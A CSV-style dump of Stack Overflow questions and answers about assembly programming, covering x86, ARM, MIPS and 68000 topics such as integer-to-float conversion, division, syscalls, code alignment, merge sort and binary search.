<p>I have some examples at github.com/dwelch67 thumbulator is a thumb instruction set simulator which for any C programmer should be easy to understand and let you examine what is going on.  amber_samples is a different approach, it is an arm2 clone (other than a few exceptions you can see a direct relationship between the arm2 and the modern arm4 and beyond that are licensed by arm.  should be a smooth transition between the two.  Being logic you need a simulator, my example uses verilator but icarus verilog should work as easily.  Where you get your visibility is by watching the program execute in the processor.  watching busses and such, instruction fetches, memory cycles, etc.</p>

<p>I am a big believer in writing a disassembler as a way to learn a new (to me) instruction set.  the ARM instruction set is fixed word length (32 bit) and very easy to disassemble.  the pure thumb instructions are fixed at 16 bit and even easier to disassemble.  thumb has thumb2 extensions though and that makes it harder so I would avoid those at first.  With fixed word length instruction sets you can safely walk through the binary image and disassemble as you go from beginning to end.  data will look strange, but the instructions will be in the right place.  With variable word length you cannot simply start at the beginning and disassemble linearly (using thumb2 extensions means variable-instruction-length)  you might have a three byte instruction, then one byte of data, then another byte of instruction, linearly that byte of data would be disassembled as an instruction and if it happens to decode as a multi-byte instruction then now you are out of sync.  The only proper way to disassemble a variable instruction length binary is to follow all paths of the code in execution order and from that disassemble what you can (without emulating every possible code path you may not be able to distinguish all of the instructions from data).  variable instruction length disassembly is definitely an advanced topic, get some strength in assembly language first.  Perhaps even create an instruction set simulator for a variable word length instruction set before tackling a disassembler (you have to basically, decode your way through the binary anyway, not completely decoding but partially decoding to make a disassembler for a variable word length instruction set.    sorry for the long description there.  </p>

<p>both the thumbulator and amber_samples approaches are fixed instruction length making it easy to see the asm to machine code to asm relationship.  as well as see your code running and understand why it went off in to the weeds and died (which you wouldnt see on the raspberry pi or any other hardware).  </p>

<p>There is a cambride university example that holds your hand through simple blinking led examples and then into video pixels. as well as other individuals who have posted links to their examples in the bare metal section of the discussion forums.    to get a feel for ""how do I do this in assembly language"" write small C functions, compile (with optimization) then disassemble.  I am specifically talking about code like a + b, not code like printf().  There is learning the assembly language, the instruciton set, which is specific (common) to the processor family.  then I would argue AFTER THAT learn system calls or library calls.  ""how do I print a string"" kind of stuff involves either hardware learning, system (a rom monitor/debugger) or library (C library or other higher level languages function calls and convention to take advantage of their libraries, which may themselves call many other libraries causing a lot of junk linked in).  so using C to learn ""assembly language"" means no library calls, no memcpy no printf etc.  it is up to you though, if you use the system and library calls then you have to write your asm code to run on that system or link with those calls which might themselves have a system dependency.  Think about learning a high level language C or Python, etc.  there is learning the language, declaring variables learning the operators for add, subtract, xor, etc.  How to use pointers and arrays, etc. At some point you learn the C library calls, printf(), strcpy(), malloc, etc.  YMMV, learn then language then the system calls separately or learn the langauge BY learning to interface to the system calls (learn them together).  </p>

<p>If you choose to learn asm as part of the system then I recommend staying in linux, create a number simple C functions, compile and disassemble, learn the calling convention for the compiler and use the arm reference materials to look up the instructions as you see them created by the compiler.  learn to create that function from scratch using asm and link it in with the C program, then modify that function.  This is a completely different approach than what I have been describing above.  wrought with the possibility of failure, but is definitely a learn by example approach.</p>
","13662580"
"Where can I find the world's fastest atof implementation?","7480","","<p>I'm looking for an extremely fast atof() implementation on IA32 optimized for US-en locale, ASCII, and non-scientific notation.  The windows multithreaded CRT falls down miserably here as it checks for locale changes on every call to isdigit().  Our current best is derived from the best of perl + tcl's atof implementation, and outperforms msvcrt.dll's atof by an order of magnitude.  I want to do better, but am out of ideas.  The BCD related x86 instructions seemed promising, but I couldn't get it to outperform the perl/tcl C code.  Can any SO'ers dig up a link to the best out there?  Non x86 assembly based solutions are also welcome.</p>

<p>Clarifications based upon initial answers:</p>

<p>Inaccuracies of ~2 ulp are fine for this application.<br>
The numbers to be converted will arrive in ascii messages over the network in small batches and our application needs to convert them in the lowest latency possible.</p>
","<p>What is your accuracy requirement? If you truly need it ""correct"" (always gets the nearest floating-point value to the decimal specified), it will probably be hard to beat the standard library versions (other than removing locale support, which you've already done),  since this requires doing arbitrary precision arithmetic. If you're willing to tolerate an ulp or two of error (and more than that for subnormals), the sort of approach proposed by cruzer's can work and may be faster, but it definitely will not produce &lt;0.5ulp output. You will do better accuracy-wise to compute the integer and fractional parts separately, and compute the fraction at the end (e.g. for 12345.6789, compute it as 12345 + 6789 / 10000.0, rather than 6*.1 + 7*.01 + 8*.001 + 9*0.0001) since 0.1 is an irrational binary fraction and error will accumulate rapidly as you compute 0.1^n. This also lets you do most of the math with integers instead of floats.</p>

<p>The BCD instructions haven't been implemented in hardware since (IIRC) the 286, and are simply microcoded nowadays. They are unlikely to be particularly high-performance.</p>
","98977"
"How to convert an integer to a floating point value in x86 ASM?","7478","","<p>I need to multiply an integer (two's compliment) by a floating point constant. Here is what I have:</p>

<pre><code>.data
pi  dd 3.14
int dd 0ah


.code
fld pi

???

fmul ST(1), ST
</code></pre>

<p>How can I convert <code>int</code> to a floating point value for multiplying against <code>pi</code>?</p>
","<p>You need the <code>fild</code> instruction. Here's one reference: <a href=""http://www.website.masmforum.com/tutorials/fptute/fpuchap5.htm"" rel=""noreferrer"">http://www.website.masmforum.com/tutorials/fptute/fpuchap5.htm</a></p>
","3027429"
"Masm on Windows 7","7472","","<p>I want to compile and execute assembly files on windows 7.
In school they use DOS in which we are able to run MASM to compile and link and execute .asm files typed out.</p>

<p>Is there a way to do the same with these .asm files on windows 7?</p>
","<p>Install <code>XP Mode</code> or <code>DosBox</code> and run MASM and your programs there.</p>
","10600315"
"What are the sizes of tword, oword and yword operands?","7455","","<p>What are the sizes of <code>tword</code>, <code>oword</code> and <code>yword</code> operands, as used in the <a href=""http://www.nasm.us/doc/nasmdoc3.html"" rel=""noreferrer"">NASM</a>/<a href=""http://www.tortall.net/projects/yasm/manual/html/manual.html"" rel=""noreferrer"">YASM manual</a>? And on a related note, is there a trick or underlying idea to these names? Is there a way by which bigger word sizes are given logical names?</p>

<p>I know that while word sizes may differ between systems, a NASM <code>word</code> is 2 bytes, <code>dword</code> is double that (4 bytes), <code>qword</code> is a quad word (8 bytes), but... is <code>tword</code> a <em>triple word</em> (6 bytes)? And for <code>oword</code> and <code>yword</code> I can't even think of a plausible meaning.</p>

<p>Note that it is probably an easy question, but I couldn't find an answer. In the NASM and YASM manuals these sizes are not explained, not even at the <code>DQ</code>, <code>DT</code>, <code>DY</code>, <code>RESQ</code>, <code>REST</code>, <code>RESY</code> pseudo-instructions. I read somewhere that MASM uses a similar system, but could not find anything on that either.</p>

<hr>

<p>Edit: Based on the answers, this is the complete list:</p>

<ul>
<li>1 byte (8 bit): <code>byte</code>, <code>DB</code>, <code>RESB</code></li>
<li>2 bytes (16 bit): <code>word</code>, <code>DW</code>, <code>RESW</code></li>
<li>4 bytes (32 bit): <code>dword</code>, <code>DD</code>, <code>RESD</code></li>
<li>8 bytes (64 bit): <code>qword</code>, <code>DQ</code>, <code>RESQ</code></li>
<li>10 bytes (80 bit): <code>tword</code>, <code>DT</code>, <code>REST</code></li>
<li>16 bytes (128 bit): <code>oword</code>, <code>DO</code>, <code>RESO</code>, <code>DDQ</code>, <code>RESDQ</code></li>
<li>32 bytes (256 bit): <code>yword</code>, <code>DY</code>, <code>RESY</code></li>
<li>64 bytes (512 bit): <code>zword</code>, <code>DZ</code>, <code>RESZ</code></li>
</ul>
","<p>Looking at <a href=""http://mobil.btnet.com.tr/btnetmobil/script/package/trash/old_20100/ffmpeg2/yasm-0.8.0/modules/parsers/nasm/nasm-token.re"">TFS</a>, it looks like:</p>

<ul>
<li>'oword'/'DO' is 8 times as big as ""word"" (O for <strong>o</strong>ctoword), synonymous with dqword (""double-quad""); that would be 128 bits, corresponding to the size of an SSE vector register.</li>
<li>'tword'/'DT' is 80 bits (T for <strong>t</strong>en bytes), the full size of an Intel x87 floating point register.</li>
<li>'yword'/'DY' is 256 bits, and the Y is presumably mnemonic for the YMM names of the 256-bit vector registers in the Intel AVX extensions.</li>
<li>'zword'/'DZ' is 512 bits, Z for the ZMM names of the 512-bit vector registers in the Intel AVX-512 extensions.</li>
</ul>

<p>So, not exactly a logical naming convention. </p>
","12064005"
"multiplying two two digit numbers with both the numbers taken as input and result is also to be printed in Tasm","7450","","<p>i am not understanding as to what can be done in this case 
single digit multiplication was possible using the AAM instruction 
however for AAM you need unpacked BCD therefore the result after two digit multiplication wont be accumulated in the AX register...</p>

<p>so i need an idea as to how i can proceed with this problem .thank you </p>

<p>here is how the input should look like (to take one two digit number) and BCD is desirable </p>

<pre><code>mov dx,offset msg
mov ah,09h
int 21h

mov ah,01h
int 21h

mov ch,al
sub ch,30h
ror ch,04h

mov ah,01h
int 21h

mov cl,al
sub cl,30h
add cl,ch
</code></pre>
","<pre><code>mynumber1 db ?
mynumber2 db ?

mov ah,01h
int 21h
sub al, 30h &lt;- ASCII to value 

mov bl, 0Ah 
mul bl &lt;- multiply al with 10

mov mynumber1, al &lt;- mynumber1 now stores the tens (i.e. if you entered 8 it's now 80)

mov ah,01h
int 21h 
sub al, 30h &lt;- ASCII to value, al now stores the ones

add mynumber1, al &lt;- now your two-digit number is completely in mynumber1
</code></pre>

<p>Now repeat the same for <code>mynumber2</code>. Then:</p>

<pre><code>mov al, mynumber1
mov bl, mynumber2

mul bl
</code></pre>

<p>Now the product is in <code>AX</code>. Proceed by converting the content of <code>AX</code> back to BCD, if you really need to.</p>

<hr>

<p>The following code will print a number with <strong>up to 4 digits</strong> stored in AX:</p>

<pre><code>xor dx,dx
mov bx,03E8h
div bx
call printdig

mov ax,dx
xor dx,dx
mov bx,0064h
div bx
call printdig

mov ax,dx
xor dx,dx
mov bx,000Ah
div bx
call printdig

;remainder from last div still in dx
mov al,dl
call printdig
</code></pre>

<p>Note that you need the following helper function, which prints a single digit from <code>al</code>:</p>

<pre><code>printdig proc
push dx
mov dl,al
add dl,30h
mov ah,02h
int 21h
pop dx
ret
printdig endp
</code></pre>
","19183233"
"How to call C++ functions in my assembly code","7441","","<p>I need to call PrintResult from my assembly to display the result. I know I have to use extrn _PrintResult somewhere, and I should call the function using call _PrintResult but I'm not sure quite sure how to use it. any suggestions</p>

<pre><code>public _Square

.386

.model flat

.code

_Square proc

mov eax, [esp+4]

imul eax

ret

_Square endp
</code></pre>

<p>.............Here is my C++ code.........</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;

enum ResultCode {ShowSquare};
enum SuccessCode {Failure, Success};

extern ""C"" long Square (long);

void main ()
 {
 long Num1; 
         long Num2;

 do
  {
  cout &lt;&lt; ""Enter Number to Square"" &lt;&lt; endl;
  cin &gt;&gt; Num1;
  Result = Square (Num1);
  cout &lt;&lt; ""Square is: "" &lt;&lt; Result &lt;&lt; endl;
  } while (Result &gt; 0);
 }

void PrintResult (ResultCode PrintCode, long Value) //PrintCode, long Value)
 {
 switch (PrintCode)
  {
  case ShowSquare:
    cout &lt;&lt; ""Display of square is: "" &lt;&lt; Value &lt;&lt; endl;
    break;

  default:
    cout &lt;&lt; ""Error in assembly routines"" &lt;&lt; endl;
  }
}
</code></pre>
","<p>I usually don't like to post full code for things, but give this a try:</p>

<h2>32-bit Assembly</h2>

<pre><code>.386
.model flat
.code

_Square proc
mov eax, [esp+4]
imul eax

push eax ; Save the calculated result

; Call PrintResult here
push eax ; value
push 0 ; ShowSquare
call _PrintResult
add esp, 8 ; Clear the stack

pop eax ; Return the calculated result

ret
_Square endp
</code></pre>

<h2>C++</h2>

<pre><code>#include &lt;iostream&gt;

using namespace std;

enum ResultCode {ShowSquare};
enum SuccessCode {Failure, Success};

extern ""C"" long Square(long);

int main(int argc, char* argv[])
{
    long Num1, Num2;

    do
    {
        cout &lt;&lt; ""Enter number to square"" &lt;&lt; endl;
        cin &gt;&gt; Num1;
        Num2 = Square(Num1);
        cout &lt;&lt; ""Square returned: "" &lt;&lt; Num2 &lt;&lt; endl;
    }
    while (Num2);

    return 0; 
}

extern ""C""
void PrintResult(ResultCode result, long value)
{
    switch (result)
    {
        case ShowSquare:
            cout &lt;&lt; ""Square is: "" &lt;&lt; value &lt;&lt; endl;
            break;

        default:
            cout &lt;&lt; ""Error calculating square"" &lt;&lt; endl;
            break;
    }
}
</code></pre>

<p><br/></p>

<p>Because you are writing a C program, the default calling mechanism is <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow"">cdecl</a> which means that all the parameters are passed on the stack, the return value is passed back in <code>eax</code>, and the caller is responsible for cleaning up the stack afterward.</p>

<p>So in order to call PrintResult, you have to push all of your parameters onto the stack before invoking the procedure. And after the procedure returns, we have to clean up our stack (<code>add esp, 8</code>).</p>

<p>Because the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow"">cdecl</a> calling convention allows <code>eax</code> to be modified during the call, <code>eax</code> may not be preserved when PrintResult returns, so we save the calculated result before calling PrintResult and then restore it after the call returns.</p>

<p>I have not tried the above code, but I hope it helps get you going down the right track.</p>

<p><br/></p>

<p><strong>Note:</strong> Because you are using a C++ compiler, the <code>extern ""C""</code> before PrintResult is required.</p>
","3911792"
"Why should code be aligned to even-address boundaries on x86?","7429","","<p>I am working through Kip Irvine's <strong>""Assembly Language for x86 Processors, sixth edition""</strong> and am really enjoying it.</p>

<p>I have just read about the NOP mnemonic in the following paragraph:</p>

<pre><code>""It [NOP] is sometimes used by compilers and assemblers to align code to 
 even-address boundaries.""
</code></pre>

<p>The example given is:</p>

<pre><code>00000000   66 8B C3   mov ax, bx
00000003   90         nop
00000004   8B D1      mov edx, ecx
</code></pre>

<p>The book then states:</p>

<pre><code>""x86 processors are designed to load code and data more quickly from even 
 doubleword addresses.""
</code></pre>

<p>My question is:  Is the reason this is so is because for the x86 processors the book refers to (32 bit), the word size of the CPU is 32 bits and therefore it can pull the instructions with the NOP in and process them in one go ?  If this is the case, I am assuming that a 64 bit processor with a word size of a quadword would do this with a hypothetical 5 bytes of code plus a nop ?</p>

<p>Lastly, after I write my code, should I go through and correct alignment with NOP's to optimize it, or will the compiler (MASM, in my case), do this for me, as the text seems to imply ?</p>

<p>Thanks,</p>

<p>Scott</p>
","<p>Code that's executed on word (for 8086) or DWORD (80386 and later) boundaries executes faster because the processor fetches whole (D)words.  So if your instructions aren't aligned then there is a stall when loading.</p>

<p>However, you can't dword-align every instruction.  Well, I guess you could, but then you'd be wasting space and the processor would have to execute the NOP instructions, which would kill any performance benefit of aligning the instructions.</p>

<p>In practice, aligning code on dword (or whatever) boundaries only helps when the instruction is the target of a branching instruction, and compilers typically will align the first instruction of a function, but won't align branch targets that can also be reached by fall through.  For example:</p>

<pre><code>MyFunction:
    cmp ax, bx
    jnz NotEqual
    ; ... some code here
NotEqual:
    ; ... more stuff here
</code></pre>

<p>A compiler that generates this code will typically align <code>MyFunction</code> because it is a branch target (reached by <code>call</code>), but it won't align the <code>NotEqual</code> because doing so would insert <code>NOP</code> instructions that would have to be executed when falling through.  That increases code size and makes the fall-through case slower.</p>

<p>I would suggest that if you're just learning assembly language, that you don't worry about things like this that will most often give you marginal performance gains.  Just write your code to make things work.  After they work, you can profile them and, if you think it's necessary after looking at the profile data, align your functions.</p>

<p>The assembler typically won't do it for you automatically.</p>
","4909633"
"Assembly? LD & MOV","7424","","<p>What's the difference between that instructions? By example in the ARM9 processor, it shouldn't be:</p>

<pre><code>ASM: mov r0, 0
C: r0 = 0;

ASM: ld r0, 0
C: r0 = 0;
</code></pre>

<p>?</p>

<p>I don't know why to use one or other :S</p>
","<p>It must be:</p>

<pre><code>ASM: mov r0, 0
C:   r0 = 0;

ASM: ld r0, 0
C:   r0 = *(pc + 0);
</code></pre>

<p>Check out <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.qrc0001m/QRC0001_UAL.pdf"" rel=""nofollow noreferrer"">this</a> reference card, must have if you're developing for ARM on ASM.</p>
","3219501"
"How do we clear the console in assembly?","7424","","<p>I am looking for a win32 api function that clears the console, much like the <code>cls</code> command
Thanks!
Devjeet</p>
","<p>This is pretty old, but <em>should</em> still work. Conversion to assembly language is left as an exercise for the reader, but shouldn't be terribly difficult (most of it is just function calls, and the multiplication is trivial):</p>

<pre><code>#include &lt;windows.h&gt;

void clear_screen(char fill = ' ') { 
    COORD tl = {0,0};
    CONSOLE_SCREEN_BUFFER_INFO s;
    HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);   
    GetConsoleScreenBufferInfo(console, &amp;s);
    DWORD written, cells = s.dwSize.X * s.dwSize.Y;
    FillConsoleOutputCharacter(console, fill, cells, tl, &amp;written);
    FillConsoleOutputAttribute(console, s.wAttributes, cells, tl, &amp;written);
    SetConsoleCursorPosition(console, tl);
}
</code></pre>
","5866648"
"Programming Environment for a Motorola 68000 in Linux","7424","","<p>Greetings all,</p>

<p>I am taking a Structure and Application of Microcomputers course this semester and we're programming with the Motorola 68000 series CPU/board. The course syllabus suggests running something like Easy68K or Teesside Motorola 68000 Assembler/Emulator at home to test our programs.</p>

<p>I told my prof I run x64 Linux and asked what sort of environment I would need to complete my coursework. He said that the easiest environment to use is a Windows XP 32bit VM with one of the two suggested applications installed, however, he doesn't really care what I use as long as I can test what I write at home.</p>

<p>So I'm asking if there exists some sort of emulator or environment for Linux so I can test my code, and what sort of caveats I will run into by writing and testing my code in Linux.<br>
Also, I plan to do my editing in Vim, which probably isn't a problem, but I would like any insight into editors for 68000 assembly, if you have any.</p>

<p>Thanks!</p>

<p><strong>EDIT:</strong> Just to clarify - I don't want to install Linux on the board at all - I want to program on my home machine, test the code locally, and then bring it onto the board for grading/running.</p>
","<p>The good news is that it does look like there is some interest in making Easy68K more portable, by replacing the Windows GUI with wxWidgets. The bad news is that it is a student's final project for the prof who wrote Easy68K in the first place. See <a href=""http://www.easy68k.com/EASy68Kforum/viewtopic.php?t=638"" rel=""nofollow noreferrer"">this forum post</a> for the story.</p>

<p>You might try getting his current source kit to build. It may work well enough by now.</p>

<p>GCC has had target support for the 68K family for as long as GCC has existed, IIRC. Of course, the Gnu assembler syntax is wildly different from Motorola's.</p>

<p><strong>Edit:</strong> On the subject of editors, any friendly to programmers will do. Code coloring is not all that useful for assembly language, after all. Vim should be just fine... I wrote a lot of assembly in vi back in the day.</p>
","1414054"
"64bit nasm division idiv","7418","","<pre><code>;print out division message
mov rcx, 0                       ;zero out register
mov rax, [input]
mov rcx, [input2]
idiv rcx                        ;divide rax by rcx
mov rdi, rax                    ;for printing purposes
call print_int
</code></pre>

<p>I can't seem to figure out why this isn't dividing, I'm getting a enrror ""Floating Point Exception"" I'm using a 64bit machine and the values are integers not floating point.... ideas?</p>

<p>I know after the division takes place the quotient should be in rax, and the remainder should be in rdx i believe, but as of right now i'm just trying to get my hands on the quotient.</p>
","<p>Your function looks a little bit complicated to me.  <code>idiv</code> works as expected for me here with this function:</p>

<pre><code>_mydiv:
  xor  %rdx, %rdx ; clear high bits of dividend
  mov  %rdi, %rax ; copy dividend argument into rax
  idiv %rsi       ; divide by divisor argument
  ret             ; return (quotient is in rax)
</code></pre>

<p>Translated into NASM syntax and to the windows ABI, I think that would be something like:</p>

<pre><code>_mydiv:
  mov  r8, rdx    ; copy divisor argument to scratch register
  xor  rdx, rdx   ; clear high bits of dividend
  mov  rax, rcx   ; copy dividend argument into rax
  idiv r8         ; divide by divisor in scratch register
  ret             ; return (quotient is in rax)
</code></pre>

<p>Are you maybe stomping on your parameters and confusing something along the way?</p>

<p>Edit:  looking at your code, it occurs to me that it might not be written as a proper function at all.  The important steps are:</p>

<ol>
<li>Put dividend in RDX:RAX - for you that probably means clearing out RDX and putting the input dividend in RAX.</li>
<li>Put divisor in some other register - you chose RCX, that should be fine.</li>
<li>Divide - <code>idiv rcx</code>.</li>
<li>Result will be in RAX.</li>
</ol>

<p>You should pay particular attention to step 1 - make sure that RDX:RAX has sane contents! Why you're getting a floating point exception I can't guess from the code you've shown.</p>
","8858213"
"Assembly: Read integer from stdin, increment it and print to stdout","7418","","<p>I coded the following assembly script for IA32. It is supposed to read a number from stdin, increment it and print it to stdout, but it does not behave as expected, it doesn't print anything (maybe the reading from stdin does not terminate or something with the printing is wrong?)</p>

<pre><code>.section .text
    .globl _start

_start:
    movl $3, %eax       # use syscall 3 (read) to read from stdin
    movl $0, %ebx       # reads from stdin (FD 0)
    movl %edi, %ecx    # store input in register %edi
    movl $4, %edx       # read one byte
    int  $0x80      # invoke system call to read from stdin

    incl %edi          # increment the value we got from stdin

    movl $4, %eax       # use syscall 4 (write) to print to screen
    movl $1, %ebx       # print to stdout (FD 1)
    movl %edi, %ecx    # pointer to text to write out
    movl $4, %edx       # length of text to write out (1 byte)
    int  $0x80          # invoke system call to write to stdout

    movl $1, %eax       # use syscall 1 (exit) to exit
    movl $0, %ebx       # error code = 0
    int  $0x80          # invoke system call
</code></pre>

<p>Do you see the error? For any help I thank you in advance,</p>

<p>All the best,
Simon</p>
","<pre><code>movl %edi, %ecx    # store input in register %edi
movl $4, %edx       # read one byte
</code></pre>

<p>This part is all wrong. You can't store the result of read in a register. What that's actually doing is storing the result at the address contained in %edi, which since you haven't set it, is probably somewhere you have no business storing anything. You first need to make room in memory to store the string at. You're also reading four bytes and not one.</p>

<p>I would replace that with something like this</p>

<pre><code>subl $4, %esp
movl %esp, %ecx
movl $4, %edx
</code></pre>

<p>This will make room for 4 bytes on the stack, then use the top of the stack as the address to store the string at. You'll also have to modify the arguments for the write syscall to use this address.</p>

<p>Another problem that you'll have to deal with is that stdin and stdout usually deal with text, so what you're reading will probably be a string and not a number, to use it as a number you'll have to convert it and then convert it back before you write it out.</p>
","12495804"
"Recursive merge sort in MIPS using stack","7411","","<p>I am trying to implement the <strong>merge sort</strong> algorithm in a very dirty manner since it was told by our teacher to do so.</p>

<p>This program takes the input integer array from the user and prints the value of the array each time the sort is call (just for testing. I will correct it later). It is entirely dependent on stack . I was told to first implement it this way and then improve the algorithm further.</p>

<p>But, every time I am getting 0 as the output instead of the inputed numbers. To test I have run the code with 4 numbers (as input) as presented below</p>

<pre><code>    .data    
Array1 :    .word 0:20

Array2 :        .word 0:20

    .text
    .globl main

main :


#initial activation record ... send the three arguments to sort......0
li $v0, 5           # system call for read_int
syscall
move $t4, $v0           # number read is put in $t0

li $v0, 5           # system call for read_int
syscall
move $t5, $v0           # number read is put in $t1

li $v0, 5           # system call for read_int
syscall
move $t6, $v0           # number read is put in $t2

li $v0, 5           # system call for read_int
syscall
move $t7, $v0           # number read is put in $t3

#do the syscall for array 1 and array 2(empty)(no syscall) and size save them in t0 , t1 , t2 respectively which are then send to stack

la $t0 , Array1
sw $t4 , 0($t0)
sw $t5 , 4($t0)
sw $t6 , 8($t0)
sw $t7 , 12($t0)

la $t1 , Array2
li $t2 , 4
sw $t0, -12($sp)
sw $t1, -8($sp)
sw $t2, -4($sp)
addi $sp, $sp, -184
jal sort


#.........display the result stored in B and then clear the stack (exit the program) ...........#

li $v0, 10          # system call for exit
syscall
#....................................................................0



#creating the initial activation record .............1 
sort:
# a0 mein A (initial one) and a1 mein B (initial one) a2 mein initial n which will be taken as system call
sw $ra, 168($sp)

#//already done addi $sp , $sp , -184


#for n1 and n2
lw  $t2 , 180($sp)              #($t2 = n)
srl $t0 , $t2 , 1           #($t0 = n1 = n/2)
sra $t0 , $t2 , 1   
sub $t1 , $t2 , $t0         #($t1 = n2 = n - n1)
sw $t1 , 164($sp)       #(stored n2)
sw $t0 , 160($sp)           #(stored n1)
#la $t0 , Array1            
#la $t1 , Array2    
#sw $t1 , 80($sp)       #stored ARRAY2
#sw $t0 , 0($sp)        #stored ARRAY1
#....................................................1

#SORT FUNC FIRST PART................................2

#ASSUMPTIONS:
#a0 = A
#a1 = B
#a2 = n




#BASE CASE
li $t0 , 1          #t0 = 1
bne $t0 , $t2 , firstL      #((t2 = n) != 1) then go to firstL
lw $t1 , 172($sp)           #t1 = &amp;A
lw $t1 , 0($t1)         #t1 = A[0]
lw $t2 , 176($sp)       #t2 = &amp;B
sw $t1 , 0($t2)         #B[0] = A[0]
#sw $t2 , 176($sp)      #stored &amp;B at the desired position in stack
jr $ra

#First Loop

firstL :
#........................................................2

#CALLING SORT ...........................................3
lw $t8, 172($sp)            #loading &amp;A
sw $t8, -12($sp)            #storing &amp;A at the desired location
add $t8, $sp, $zero         #loading &amp;A1
sw $t8, -8($sp)             #storing &amp;A1 at the desired location
lw $t8, 160($sp)            #loading n1
sw $t8, -4($sp)             #storing n1 at the desired location
addi $sp, $sp, -184         
jal sort          


#.........................................................3

#CALLING SORT AGAIN ......................................4
lw $t8, 172($sp)            #loading &amp;A
lw $t7, 160($sp)            #loading n1
sll $t7 , $t7 , 2           #n1*= 4 for mips address
add $t8 , $t8 , $t7             #adding &amp;A + n1
sw $t8, -12($sp)            #storing &amp;A + n1
addi $t8, $sp, 80           #loading &amp;A2
sw $t8, -8($sp)             #storing A2
lw $t8, 164($sp)            #loading n2
sw $t8, -4($sp)
addi $sp, $sp, -184
jal sort

#calling merge...........................................5

add $a0, $sp, $zero     #a0 = &amp;A1
addi $a1, $sp, 80   #a1 = &amp;A2
lw $a2, 176($sp)    #a2 = &amp;B
lw $t8, 160($sp)    
sw $t8, -8($sp)     #stored p
lw $t8, 164($sp)
sw $t8, -4($sp)     #stored q
addi $sp, $sp, -12
jal merge
#........................................................5

#return from sort........................................8
lw $ra, 168($sp)
lw $t0 , 176($sp)
lw $t1 , 0($t0)
lw $t2 , 4($t0)
lw $t3 , 8($t0)
lw $t4 , 12($t0)
li $v0, 1           # system call for print_int
    move $a0, $t1       # number in $t3 is to be printed
    syscall

li $v0, 1           # system call for print_int
    move $a0, $t2       # number in $t3 is to be printed
    syscall
li $v0, 1           # system call for print_int
    move $a0, $t3       # number in $t3 is to be printed
    syscall
li $v0, 1           # system call for print_int
    move $a0, $t4       # number in $t3 is to be printed
    syscall
addi $sp , $sp , 184

jr $ra
#........................................................8


#Merge ..................................................6

merge: 

sw $ra, 0($sp)      #stored ra              .........
#ASSUMPTION :
#a0 = P         #available from stack though.....
#a1 = Q
#a2 = R
#s1 = p
#s2 = q

lw $s1 , 4($sp)
lw $s2 , 8($sp)

move $t0 , $zero    # t0 = i , t1 = j, t2 = k (= 0) 
move $t1 , $zero
move $t2 , $zero
While1:
sll $t3 , $t0 , 2
add $t3 , $t3 , $a0      #t3 = &amp;P[i]
sll $t4 , $t1 , 2
add $t4 , $t4 , $a1      #t4 = &amp;Q[j]
lw $t5 , 0($t3)      #t5 = P[i]
lw $t6 , 0($t4)      #t6 = Q[j]
sll $t7 , $t2 , 2
add $t7 , $t7 , $a2  #t7 = &amp;R[k]  
bge $t0 , $s1 , While2
bge $t1 , $s2 , While2   # exit loop 1 if j&gt;=q or i&gt;=p
bge $t5 , $t6 , While12
sw $t5 , 0($t7)          #R[k] = P[i]
addi $t0 , $t0 , 1   #incremented i and k
addi $t2 , $t2 , 1
j While1
While12:
sw $t6 , 0($t7)          #R[K] = Q[j] 
addi $t1 , $t1 , 1   #incremented j and k
addi $t2 , $t2 , 1
j While1

While2:
bge $t0 , $s1 , While3   #exit loop if i &gt;= p
sw $t5 , 0($t7)          #R[k] = P[i]
addi $t0 , $t0 , 1   #incremented i and k
addi $t2 , $t2 , 1
j While1

While3:
bge $t1 , $s2 , Exit    #exit loop if j&gt;= q
sw $t6 , 0($t7)         #R[k] = Q[j]
addi $t1 , $t1 , 1  #incremented j and k    
addi $t2 , $t2 , 1
j While1

Exit : 
#.........................................................6

#return from merge........................................7
lw $ra, 0($sp)
addi $sp, $sp, 12
jr $ra
#..........................................................7
    #....................... END ..................................#
</code></pre>

<p>Please tell me why it is not working. I have tried a lot. </p>

<p>I would highly appreciate the right answer.             </p>
","<p>It was very difficult but I figured out what the mistake was.</p>

<p>In the BASE CASE section, I had to restore the stack at the original point.
This is so because before the return of sort  the value 184 is added to the stack each time. 
I forgot that base case is also one instance of sort procedure itself. 
So, the value 184 has to be added there too .</p>

<p>Corrected program (base case part only) :</p>

<pre><code>li $t0 , 1                          #t0 = 1
bne $t0 , $t2 , firstL              #((t2 = n) != 1) then go to firstL
lw $t1 , 172($sp)                   #t1 = &amp;A 
lw $t1 , 0($t1)                     #t1 = A[0]
lw $t2 , 176($sp)                   #t2 = &amp;B
sw $t1 , 0($t2)                     #B[0] = A[0]
addi $sp , $sp , 184                #THE CORRECTION
jr $ra
</code></pre>
","3545805"
"binary search in assembly language","7409","","<p>I am a novice in assembly language programming<br>
I searched for binary search program and found this and I tried understand the program,its working fine but I couldnt understand the success part of the code:<br>
what is ADD al,'0' and what is mov res,al??</p>

<pre><code>.model small
.stack 100h
.data
    ARR DW 1000H,2000H,3000H,4000H,5000H,6000H
    LEN DW ($-ARR)/2
    KEY EQU 2000H
    SUC DB ""KEY IS FOUND AT$""
    FAILURE DB ""KEY IS NOT FOUND$""
    RES DB ""POSITION"",13,10,""$""
.CODE
    START:
        MOV AX,@data
        MOV DS,AX
        MOV BX,00           ;LOW
        MOV DX,LEN          ;HIGH
        MOV CX,KEY          ;KEY
    AGAIN:
        CMP BX,DX
        JA FAIL
        MOV AX,BX
        ADD AX,DX
        SHR AX,1
        MOV SI,AX
        ADD SI,SI
        CMP CX,ARR[SI]
        JAE BIG             
        DEC AX          
        MOV DX,AX
        JMP AGAIN
    BIG:
        JE SUCCESS      
        INC AX          
        MOV BX,AX
    JMP AGAIN
    SUCCESS:
        ADD AL,01
        ADD AL,'0'
        MOV RES,AL
        LEA DX SUC
        JMP DISP
    FAIL:
        LEA DX,FAILURE
    DISP:
        MOV AH,09H
        INT 21H
        MOV AH,4CH
        INT 21H
    END START
</code></pre>
","<p><code>add  al, '0'</code> converts some 1 digit number to the corresponding ASCII code in order to display it at the screen as a result value on success.</p>

<p><code>mov res, al</code> stores the value of the register AL in the first byte of the variable RES. As long as RES points to a string <code>'POSITION',13,10,'$'</code>, the value of AL will be stored on top of the character 'P' of this string and if, for example AL=33h, the string becomes <code>'3OSITION',13,10,'$'</code>.</p>
","19550014"
